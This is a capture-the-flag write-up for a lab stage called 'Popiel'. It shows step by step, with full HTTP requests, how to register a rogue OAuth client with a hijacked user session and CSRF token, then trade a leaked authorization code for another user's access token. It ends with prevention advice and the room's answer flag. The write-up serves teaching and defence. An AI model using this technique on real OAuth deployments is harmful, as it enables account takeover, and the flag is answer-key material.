[[ 🡅 Move up ]](../)</br>
[[ 🡄 Previous ]](../05_Twardowski/) **06: Popiel** [[ Next 🡆 ]](../07_End%20of%20the%20Journey/)

# ☆ Popiel, the Director ☆

> As a former king, Popiel brings a wealth of political experience to the team. He is a shrewd strategist who is well-versed in the ways of diplomacy and negotiation. Popiel's expertise is particularly valuable when it comes to navigating the complicated relationships between the Midsummer Corp and the various factions that are interested in the fern flower.

## Exploitation

### Briefing

> To succeed in your final hack, you need to become familiar with the OAuth 2.0 authorization framework. This standard allows a user to grant a third-party application access to the user's protected resources. The best part is that the application does not know the user's credentials. 
>
> **How does OAuth work?** </br> 
> To get started and understand basic terminology, watch the OAuth portion of the [video](https://www.youtube.com/watch?v=t18YB3xDfXI). 
>
> As you already know, there are 4 roles in the OAuth flow:
> - Resource Owner, 
> - Resource Server, 
> - Client, 
> - Authorization Server. 
>
> Flows have different types, called grant types. The most popular is the Authorization Code flow. You can find the nitty-gritty details, including the structure of HTTP requests, [in the blog post](https://developer.okta.com/blog/2018/04/10/oauth-authorization-code-grant-type). 
>
> Before any flow can take place, a Client and an Authorization Server must establish a trust relationship. This step is called registration, and as a result, a client receives an identifier, called client_id, and a secret value, called client_secret. 
>
> **Common OAuth issues** </br>
> <ins>1. Missing recommended properties of an authorization code</ins> </br>
> The purpose of the authorization code is to exchange it for an access token. Current guidelines list the following preferred properties:
> - The authorization code should be a one-time-use. 
> - The authorization code should expire shortly (3-5 minutes is best) after it is issued by the Authorization Server. 
> - The authorization code should be bound to a single Client.
> - The authorization code should be transmitted securely over a TLS connection. 
>
> These properties help ensure the security of the Authorization Code Flow by minimizing the window of opportunity for an attacker to intercept and misuse the authorization code. Unfortunately, many implementations do not follow them. 
>
> <ins>2. Open registration of new OAuth clients</ins> </br> 
> Registration of new OAuth Clients should be restricted. This ensures that only legitimate and trustworthy applications are granted access to user data. With a new Client verification process in place, it will be more difficult for an attacker to trick the victim into agreeing to access their data.  

**Prerequisites**: Access to `twardowski` account. </br>
**Your objective**: You should already be in possession of a leaked authorization code. It is a result of an OAuth flow initiated by one of the Popiel's advisory applications. Your task is to exchange it for an access token and access a former king's resources. Best of luck!

### Reconnaissance

> **Note** </br>
I won't explain how OAuth 2.0 work in detail but it's crucial to have knowledge about it in order to understand this attack. I refer you to two linked resources in the Briefing to better understand the flow and logic behind OAuth 2.0.

The Briefing already tells us how we are supposed to hack our way into the system - by exchanging the leaked authorization code for a token. For this to work, the server must not check which authorization code is tied to which application, giving as an Attack Vector already!

Let's start by exploring Twardowski's files. There are two that should immediately catch our attention:
- [`authorization_code.txt`](./authorization_code.txt) containing a leaked authorization code related to Popiel. That's a huge find already!
- [`supportticket_draft.txt`](./supportticket_draft.txt) containing a draft of a message explaining the problem with registration of Twardowski's client.

Closer look at the second file reveals more interesting details.

First of all, Twardowski tried to send a request to the `/apps/oauth2/clients` endpoint. Using the provided source code we can easily find all the remaining routes related to OAuth 2.0 inside `/apps/oauth2/appinfo/routes.php` file:

```PHP
return [
    'routes' => [
        ['name' => 'Settings#addClient', 'url' => '/clients', 'verb' => 'POST'],
        ['name' => 'Settings#deleteClient', 'url' => '/clients/{id}', 'verb' => 'DELETE'],
        ['name' => 'LoginRedirector#authorize', 'url' => '/authorize', 'verb' => 'GET'],
        ['name' => 'OauthApi#getToken', 'url' => '/api/v1/token', 'verb' => 'POST' ],
    ],
];
```

> **Note** </br>
> Routes in this file are registered under `/apps/oauth2` prefix, meaning `/clients` in reality maps to `/apps/oauth2/clients` etc.

Second, Twardowski was using **admin credentials** to register their new client. It might be possible to use these to gain access to everything the web app has to offer, admin is an admin after all. Furthermore, by navigating to `/u/admin` we can check that `admin` user in fact exists in the system. In all of the previous stages, the Briefing specifically mentioned what account we were trying to break into, which isn't the case for this one.

![Admin's profile](./media/admin_profile.png)

All of this further reinforces the idea that we might gain access to Popiel's account through `admin` - we will give it a try later. For now, let's try to recreate the request that Twardowski had some trouble with:

<details>
<summary>View HTTP request</summary>

```HTTP
POST /apps/oauth2/clients HTTP/1.1
Host: 10.10.181.99
Content-Type: application/json
Content-Length: 86
Cookie: ocqpfobax3l0=ea40d3c44aebc7c3d2d060ce0c74f7c4; oc_sessionPassphrase=mzJr4dxugNOXA34YgaivUEgs8P4p%2BEju7qBoC87qZ9S4Cu2lUGAo50U3HiuEw3CAfGgusiTSBSMA8s03rgJY0PcVgGbGJEbyNKV3EdvhxL5lXP83qw8xjBQM6qTj083j; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; nc_username=admin; nc_token=RhnpFe88vZTezlB9J0FmEj9S4lrX%2FLyl; nc_session_id=ea40d3c34aebb7c3d2d060ce0c74f7c4

{"name":"alchemy-mixer-ng","redirectUri":"https://alchemy-mixer-ng.ctf/auth/callback"}
```
</details>

```JSON
{
    "message": "Current user is not logged in"
}
```

There goes the plan to use Admin's cookies to make our way in - the session is no longer active and there's nothing we can do about it. What happens if we just remove those cookies and send the request again?

<details>
<summary>View HTTP request</summary>

```HTTP
POST /apps/oauth2/clients HTTP/1.1
Host: 10.10.181.99
Content-Type: application/json
Content-Length: 86

{"name":"alchemy-mixer-ng","redirectUri":"https://alchemy-mixer-ng.ctf/auth/callback"}
```
</details>

```JSON
{
    "message": "Current user is not logged in"
}
```

We get the exact same error. If we cannot access this endpoint as either an administrator or an anonymous user, could we perhaps get valid session cookies by logging in to one of the accounts we already have access to?

Inspecting the source code of the `/apps/oauth2/lib/Controller/SettingsController.php` Controller (one responsible for handling POST requests to `/apps/oauth2/clients`), confirms that we can use any of the valid accounts to register an OAuth2 client:

```PHP
/**
 * @NoAdminRequired
 */
public function addClient( /* (...) */ ): JSONResponse { /* (...) */ }
```

The `@NoAdminRequired` annotation means that to access this endpoint you don't need admin privileges. However, you still need to be a valid user, as this endpoint doesn't contain the `@PublicPage` annotation.

> **Note** </br>
The annotations are implemented and explained in `/lib/private/AppFramework/Middleware/Security/SecurityMiddleware.php`

All this information should be enough to execute the attack.

### Attack Vector

Authorization codes not being bound to a single Client.

Open registration of new OAuth Clients.

### Execution

Let's start by making sure we have appropriate cookies inside Postman. In my case, I have decided to use Twardowski's account to carry out the attack.

We will begin by sending the same request to register a new client, the only difference being that we will use Twardowski’s cookies:

<details>
<summary>View HTTP request</summary>

```HTTP
POST /apps/oauth2/clients HTTP/1.1
Host: 10.10.181.99
Content-Type: application/json
Cookie: nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; nc_session_id=ba9e16492eab2bdd36878a701373d094; nc_token=fv0mLegANs3dw4CCP%2FMMfRhLFPFpFrck; nc_username=twardowski; oc_sessionPassphrase=6HgarpeGsO99AKoYFtAJQT24i3bfrHS8VrAY7tjV4Orgza8EnvUhKfEtMTL3Cx9D3DXqdP7QH4ILnCewhmC%2BXf8t9x362vILimyfJ3tPnodJ129WI1E5TeF8YdUV6ZOV; ocuzsvwf431x=ba9e16492eab2bdd36878a701373d094
Content-Length: 89

{"name":"you-just-got-hacked","redirectUri":"https://alchemy-mixer-ng.ctf/auth/callback"}
```
</details>

```JSON
{
    "message": "CSRF check failed"
}
```

We are hit with an error, but we already encountered it before, when trying to break into [Boruta's](../04_Boruta/README.md) account. All we need to do is to add a `RequestToken` header with a valid value. We could simply copy the token from the previous request or we could search the `/core/routes.php` and find an endpoint that provides us with valid CSRF tokens:

```PHP
$application->registerRoutes($this, [
    'routes' => [
        /* (...) */
        ['name' => 'CSRFToken#index', 'url' => '/csrftoken', 'verb' => 'GET'],
        /* (...) */
    ]
]);
```

> **Note** </br>
> This endpoint is also periodically called every 12 minutes from any page within the web application.

With CSRF token included in the request, let's send it one more time:

<details>
<summary>View HTTP request</summary>

```HTTP
POST /apps/oauth2/clients HTTP/1.1
Host: 10.10.181.99
RequestToken: Fho6oufWdgP5vihwBX89oArlLQ2xuJk90eS8BGGjAnQ=:bkoV0JHvOkKa5EMAYjlQ60ayQjjb8OlEtY/yTRDESRA=
Content-Type: application/json
Cookie: nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; nc_session_id=ba9e16492eab2bdd36878a701373d094; nc_token=fv0mLegANs3dw4CCP%2FMMfRhLFPFpFrck; nc_username=twardowski; oc_sessionPassphrase=6HgarpeGsO99AKoYFtAJQT24i3bfrHS8VrAY7tjV4Orgza8EnvUhKfEtMTL3Cx9D3DXqdP7QH4ILnCewhmC%2BXf8t9x362vILimyfJ3tPnodJ129WI1E5TeF8YdUV6ZOV; ocuzsvwf431x=ba9e16492eab2bdd36878a701373d094
Content-Length: 89

{"name":"you-just-got-hacked","redirectUri":"https://alchemy-mixer-ng.ctf/auth/callback"}
```
</details>

```JSON
{
    "id": 2,
    "name": "you-just-got-hacked",
    "redirectUri": "https://alchemy-mixer-ng.ctf/auth/callback",
    "clientId": "hxfvzDB4w72nLVOlphIgq78im595AvjigHz0BBtP4PyFPrPGv2d6k9b3Pqh2X5ER",
    "clientSecret": "0ifBh7pD6emNkCMEsKSJRvGR7bLvdZoUbVnW8rzyGIYFFybkV8frm451ftGPtADe"
}
```

Just like that, we successfully registered an OAuth 2.0 Client! Now we can attempt to exchange the leaked authorization code for a token. This will only work if the server is not checking whether the authorization code is bound to the client that initiated the original flow.

To do this, we first much find an endpoint that's responsible for handing those tokens out. Thankfully, we already discovered it: `/apps/oauth2/api/v1/token`.

Let's craft the final request. For this, we need to [provide a few parameters](https://developer.okta.com/blog/2018/04/10/oauth-authorization-code-grant-type#exchange-the-authorization-code-for-an-access-token):
- `grant_type=authorization_code` to let the server know we want to exchange the code for a token
- `code` being the leaked authorization code
- `redirect_uri`, `client_id`, `client_secret` having the same values used to register a new Client

With that out of the way, we can finally send the request:

<details>
<summary>View HTTP request</summary>

```HTTP
POST /apps/oauth2/api/v1/token HTTP/1.1
Host: 10.10.181.99
Content-Type: application/json
Cookie: nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; nc_session_id=ba9e16492eab2bdd36878a701373d094; nc_token=fv0mLegANs3dw4CCP%2FMMfRhLFPFpFrck; nc_username=twardowski; oc_sessionPassphrase=6HgarpeGsO99AKoYFtAJQT24i3bfrHS8VrAY7tjV4Orgza8EnvUhKfEtMTL3Cx9D3DXqdP7QH4ILnCewhmC%2BXf8t9x362vILimyfJ3tPnodJ129WI1E5TeF8YdUV6ZOV; ocuzsvwf431x=ba9e16492eab2bdd36878a701373d094
Content-Length: 431

{
    "grant_type": "authorization_code",
    "code": "Oz5xWmb0pCQEZJp6puQQoSKuM1JK9jczqe3CLKqvl0VuFM7VsWJFqMU6CF0T0ipdOtmy8lkRPIsz0PoWSTbf2gTLx86NZ7YYIY6pZ0Sj8nP6kcQY2uUFRVhxzmAhudrR",
    "client_id": "hxfvzDB4w72nLVOlphIgq78im595AvjigHz0BBtP4PyFPrPGv2d6k9b3Pqh2X5ER",
    "client_secret":"0ifBh7pD6emNkCMEsKSJRvGR7bLvdZoUbVnW8rzyGIYFFybkV8frm451ftGPtADe",
    "redirect_uri": "https://alchemy-mixer-ng.ctf/auth/callback"
}
```
</details>

```JSON
{
    "access_token": "q4HyexEnRcUn51shio4kHrS1KCb8NFFNk2efW6BNGYMeIdFXLv9TlkQFBG10eQ2Q4wJ7qDyS",
    "token_type": "Bearer",
    "expires_in": 3600,
    "refresh_token": "Oz5xWmb0pCQEZJp6puQQoSKuM1JK9jczqe3CLKqvl0VuFM7VsWJFqMU6CF0T0ipdOtmy8lkRPIsz0PoWSTbf2gTLx86NZ7YYIY6pZ0Sj8nP6kcQY2uUFRVhxzmAhudrR",
    "user_id": "popiel"
}
```

Voilà! We successfully exchanged the leaked authorization code for a pair of tokens. We are only interested in the `access_token` though, as we have exactly 1 hour to grab what we need before it expires - that's a lot of time.

To access Popiel's files, we can once again use ModHeader to include a proper `Authorization` header with each request sent by the web browser:

```HTTP
Authorization: Bearer q4HyexEnRcUn51shio4kHrS1KCb8NFFNk2efW6BNGYMeIdFXLv9TlkQFBG10eQ2Q4wJ7qDyS
```

![ModHeader with Authorization header added](./media/modheader.png)

Finally, after all of this, we gain access to Former King's resources.

![Popiel's files are within reach](./media/popiel_files.png)

## Prevention

As you integrate OAuth 2.0 flow into your environment, be sure to familiarize yourself with current best practices related to this standard. The [OAuth 2.0 Threat Model and Security Considerations](https://datatracker.ietf.org/doc/html/rfc6819) document is a valuable source of considerations beyond those covered in the original specification.

In our scenario, the authorization codes should only be bound to a single Client. This would prevent the leaked code from being used by a newly created Client. In addition, if the authorization code were short-lived, it would likely expire before the attackers could figure out a feasible exploitation scenario. Finally, restricting the registration of new OAuth Clients to trusted individuals would further reduce the attack surface. 

## Tasks

### What endpoint you should use to exchange the OAuth code for a token?

<details>
<summary>Answer</summary>

`/apps/oauth2/api/v1/token`

</details>

Found in `/apps/oauth2/appinfo/routes.php` file defining the application routes related to OAuth 2.0.

### What is the content of the Fern_flower_ritual_shard6.txt file in Popiel's account?

<details>
<summary>Fern_flower_ritual_shard6.txt</summary>

`Midsummer_Corp{Spr1nkle_wat3r_fr0m_a_s@cr3d_spr1ng_0n_th3_fern}`

</details>

Found in the account's files.

</br>
</br>
</br>

[[ 🡅 Move up ]](../)</br>
[[ 🡄 Previous ]](../05_Twardowski/) **06: Popiel** [[ Next 🡆 ]](../07_End%20of%20the%20Journey/)